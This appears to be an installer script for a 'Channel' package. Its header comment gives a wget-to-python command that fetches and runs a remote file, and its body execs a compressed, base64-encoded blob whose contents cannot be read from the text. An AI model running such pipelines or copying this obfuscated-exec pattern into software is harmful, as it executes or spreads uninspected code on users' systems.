# -*- coding: utf-8 -*-
# code: BY MOHAMED_OS

# ###########################################
# SCRIPT : DOWNLOAD AND INSTALL Channel
# ###########################################
#
# Command: wget https://raw.githubusercontent.com/MOHAMED19OS/Download/main/Channel/installer.py -qO - | python
#
# ###########################################

from zlib import decompress
from base64 import b64decode

exec(decompress(b64decode('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')))
